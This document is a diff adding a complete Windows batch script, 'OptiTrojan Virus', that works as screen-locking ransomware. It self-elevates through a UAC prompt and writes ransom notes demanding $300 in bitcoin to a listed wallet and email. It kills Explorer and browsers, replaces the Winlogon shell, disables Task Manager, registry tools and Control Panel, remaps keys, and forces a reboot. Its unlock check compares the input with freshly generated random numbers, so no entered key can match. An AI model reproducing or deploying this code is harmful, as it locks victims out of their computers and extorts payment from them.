@@ -1,0 +1,182 @@
+@echo off
+
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+if '%errorlevel%' NEQ '0' (
+
+    echo Admin ...
+
+    goto UACPrompt
+
+) else ( goto gotAdmin )
+
+:UACPrompt
+
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+
+    set params = %*:"=""
+
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+
+
+    "%temp%\getadmin.vbs"
+
+    rem del "%temp%\getadmin.vbs"
+
+    exit /B
+
+
+
+:gotAdmin
+
+cls
+
+echo CreateObject("SAPI.SpVoice").Speak "Attnetion! Attention! Attention!" > %userprofile%\Appdata\Local\Temp\Voice.vbs
+echo do >> %userprofile%\Appdata\Local\Temp\Voice.vbs
+echo CreateObject("SAPI.SpVoice").Speak "Your computer was banned by OptiTrojan!" >> %userprofile%\Appdata\Local\Temp\Voice.vbs
+echo loop >> %userprofile%\Appdata\Local\Temp\Voice.vbs
+
+cls
+
+echo ==================================================================================================== > READ_ME.txt
+echo ================= You are using old windows! Please, upgrade your windows version! ================= >> READ_ME.txt
+echo ==================================================================================================== >> READ_ME.txt
+echo ======================================= OptiTrojan Virus 1.0 ======================================= >> READ_ME.txt
+echo ==================================================================================================== >> READ_ME.txt
+echo. >> READ_ME.txt
+echo Your computer was hacked by OptiTrojan Virus! >> READ_ME.txt
+echo So, you can't use your computer! Also, this virus was blocked important windows program! >> READ_ME.txt
+echo Maybe, you will busy due to recover your computer! But, don't waste your time! >> READ_ME.txt
+echo Anyone can't recover computer without decryptor! >> READ_ME.txt
+echo So, If you want to recover your computer, follow below instructions! >> READ_ME.txt
+echo. >> READ_ME.txt
+echo ==================================================================================================== >> READ_ME.txt
+echo. >> READ_ME.txt
+echo 1. Send worth of 300$ bitcoin to below address! >> READ_ME.txt
+echo 12uwVDqzrPEaquSprYTvwkoTYwkiL5YxM3 >> READ_ME.txt
+echo. >> READ_ME.txt
+echo 2. Send your bitcoin wallet ID and your personal key to KOR_TTTmap@protonmail.ch >> READ_ME.txt
+echo This is your personal key : %%random%%-%%random%%-%%random%%-%%random%%-%%random%% >> READ_ME.txt
+echo. >> READ_ME.txt
+echo 3. And download recover program you received via email! >> READ_ME.txt
+echo. >> READ_ME.txt
+echo ==================================================================================================== >> READ_ME.txt
+echo Remember! Important program will disable until recover your computer! >> READ_ME.txt
+echo And, don't delete this file until download and run recover program! >> READ_ME.txt
+echo So..... Good luck! >> READ_ME.txt
+echo ==================================================================================================== >> READ_ME.txt
+
+cls
+
+echo @echo off > %userprofile%\Appdata\Local\Temp\Information.bat
+echo title Your computer was banned! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo Color 1b >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo mode con cols=107 lines=37 >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im explorer.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im msedge.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im iexplore.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im chrome.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im firefox.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im safari.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im opera.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im swing.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im whale.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im avant.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im avantvw.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im xbrowser.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im ybrowser.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im zbrowser.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im WebMa.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im WebMa_x64.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im jwBrowser.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im Maxthon.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im szbrowser.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo taskkill /f /im ucbrowser.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo start %%userprofile%%\Appdata\Local\Temp\Voice.vbs >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo cls >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ==================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ========================================= OptiTrojan Virus ========================================= >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ==================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo YOUR COMPUTER WAS BANNED BY OPTITROJAN VIRUS! PLEASE FOLLOW BELOW INSTRUCTIONS! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ==================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Your computer was banned by optitrojan virus! So, you can't use your computer! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Maybe, you will busy due to recover your computer. But, don't waste your time! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo You can recover your computer anytime! But, you need to send bitcoin to recover your computer! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo So, If you want to recover your computer, follow below instructions! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ==================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo 1. Send worth of 300$ bitcoin to below address! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo 12uwVDqzrPEaquSprYTvwkoTYwkiL5YxM3 >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo 2. Send your bitcoin wallet ID and your personal key to KOR_TTTmap@protonmail.ch! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo This is your personal key : %%random%%-%%random%%-%%random%%-%%random%%-%%random%% >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo 3. And enter your recover key you received via email! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ==================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo And remember! TaskManager will disable until enter the recover key! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo And, this message will appear again when you restart your computer! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo So, If you want to recover your computer, you need to send bitcoin and enter the recover key! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo So..... Good Luck! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ==================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ==================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo ==================================================================================================== >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo set /p password=Enter Here: >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo if %%password%% == %%random%%%%random%%%%random%%%%random%%%%random%% goto end >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo goto fail >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo :fail >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Recover key is wrong! Try again! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo set /p password=Enter Here: >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo if %%password%% == %%random%%%%random%%%%random%%%%random%%%%random%% goto end >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo goto fail >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo :end >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo cls >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo title Decrypted! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo start explorer.exe >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo Your computer was decrypted! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo If you want to disable Taskmanager, please Run this to Administrator : %%userprofile%%\Appdata\Local\Temp\EnableTaskMgr.bat >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo And you did great! Press any key to continue! >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo echo. >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo pause >> %userprofile%\Appdata\Local\Temp\Information.bat
+echo del /q %%userprofile%%\Appdata\Local\Temp\Information.bat >> %userprofile%\Appdata\Local\Temp\Information.bat
+
+cls
+
+echo @echo off > %userprofile%\Appdata\Local\Temp\EnableTaskMgr.bat
+echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f >> %userprofile%\Appdata\Local\Temp\EnableTaskMgr.bat
+echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 0 /f >> %userprofile%\Appdata\Local\Temp\EnableTaskMgr.bat
+echo shutdown -r -t 5 >> %userprofile%\Appdata\Local\Temp\EnableTaskMgr.bat
+
+cls
+
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d %userprofile%\Appdata\Local\Temp\Information.bat /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3} /v Restrict_Run /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search /v SearchboxTaskbarMode /t REG_DWORD /d 0 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f
+
+cls
+
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+cls
+
+shutdown -r -f -t 2
